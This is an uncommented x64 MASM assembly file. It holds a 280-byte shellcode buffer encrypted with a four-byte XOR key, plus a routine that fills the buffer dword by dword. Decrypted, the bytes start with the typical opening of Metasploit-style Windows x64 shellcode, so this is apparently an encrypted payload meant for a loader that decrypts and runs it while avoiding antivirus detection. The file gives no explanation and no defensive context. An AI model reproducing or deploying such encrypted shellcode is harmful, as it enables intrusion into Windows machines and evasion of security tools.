SHELLCODE MACRO
ENDM
public SHELLSIZE
SHELLSIZE EQU 0118h
public KEYSIZE
KEYSIZE EQU 04h
.data
public sc
sc dq 35 dup(0)
public key
key db 046h, 075h, 063h, 06bh
.code
init_sc proc
        mov dword ptr [sc + 0], 08FE03DBAh 
        mov dword ptr [sc + 4], 06BA39DB6h 
        mov dword ptr [sc + 8], 03A227546h 
        mov dword ptr [sc + 12], 03A312507h 
        mov dword ptr [sc + 16], 0B9523D10h 
        mov dword ptr [sc + 20], 039E83D23h 
        mov dword ptr [sc + 24], 039E83D26h 
        mov dword ptr [sc + 28], 039E83D5Eh 
        mov dword ptr [sc + 32], 019E83D66h 
        mov dword ptr [sc + 36], 0DC6C3D16h 
        mov dword ptr [sc + 40], 05A2E3F0Ch 
        mov dword ptr [sc + 44], 0AB523D8Fh 
        mov dword ptr [sc + 48], 0170249EAh 
        mov dword ptr [sc + 52], 02A435944h 
        mov dword ptr [sc + 56], 02A6EBC87h 
        mov dword ptr [sc + 60], 08681B447h 
        mov dword ptr [sc + 64], 023323414h 
        mov dword ptr [sc + 68], 0E04327CDh 
        mov dword ptr [sc + 72], 06A2B4904h 
        mov dword ptr [sc + 76], 0E3E3FE96h 
        mov dword ptr [sc + 80], 023637546h 
        mov dword ptr [sc + 84], 00C17B5C3h 
        mov dword ptr [sc + 88], 03BB3740Eh 
        mov dword ptr [sc + 92], 02F7B3DCDh 
        mov dword ptr [sc + 96], 0224335CDh 
        mov dword ptr [sc + 100], 03D80A547h 
        mov dword ptr [sc + 104], 02AAA8A0Eh 
        mov dword ptr [sc + 108], 023EB41CDh 
        mov dword ptr [sc + 112], 05A2EA347h 
        mov dword ptr [sc + 116], 0AB523D8Fh 
        mov dword ptr [sc + 120], 0A2A234EAh 
        mov dword ptr [sc + 124], 0AA62344Bh 
        mov dword ptr [sc + 128], 09A16957Eh 
        mov dword ptr [sc + 132], 04F2F760Ah 
        mov dword ptr [sc + 136], 0BA5A304Eh 
        mov dword ptr [sc + 140], 02F3BAD33h 
        mov dword ptr [sc + 144], 0224735CDh 
        mov dword ptr [sc + 148], 02A05A547h 
        mov dword ptr [sc + 152], 02F2B79CDh 
        mov dword ptr [sc + 156], 0227F35CDh 
        mov dword ptr [sc + 160], 0E022A547h 
        mov dword ptr [sc + 164], 06A2BFD42h 
        mov dword ptr [sc + 168], 02A3B3496h 
        mov dword ptr [sc + 172], 0313A2B1Eh 
        mov dword ptr [sc + 176], 032222D07h 
        mov dword ptr [sc + 180], 0E82B2F07h 
        mov dword ptr [sc + 184], 0392255AAh 
        mov dword ptr [sc + 188], 02A3B95B9h 
        mov dword ptr [sc + 192], 0E02B2F1Fh 
        mov dword ptr [sc + 196], 094349C54h 
        mov dword ptr [sc + 200], 0233E8AB9h 
        mov dword ptr [sc + 204], 06B6374FCh 
        mov dword ptr [sc + 208], 06B637546h 
        mov dword ptr [sc + 212], 0E6EE3D46h 
        mov dword ptr [sc + 216], 06B637447h 
        mov dword ptr [sc + 220], 0E052CF07h 
        mov dword ptr [sc + 224], 0BE9CF229h 
        mov dword ptr [sc + 228], 0C9D685FDh 
        mov dword ptr [sc + 232], 0CDD93410h 
        mov dword ptr [sc + 236], 094FEC8D3h 
        mov dword ptr [sc + 240], 0AFE03D93h 
        mov dword ptr [sc + 244], 01765496Eh 
        mov dword ptr [sc + 248], 08B98F54Ch 
        mov dword ptr [sc + 252], 02CD87033h 
        mov dword ptr [sc + 256], 0010C0755h 
        mov dword ptr [sc + 260], 0E2222C46h 
        mov dword ptr [sc + 264], 008B68A9Ch 
        mov dword ptr [sc + 268], 045001927h 
        mov dword ptr [sc + 272], 06B060D23h 
        mov dword ptr [sc + 276], 0FBF3E5D6h 
ret
init_sc endp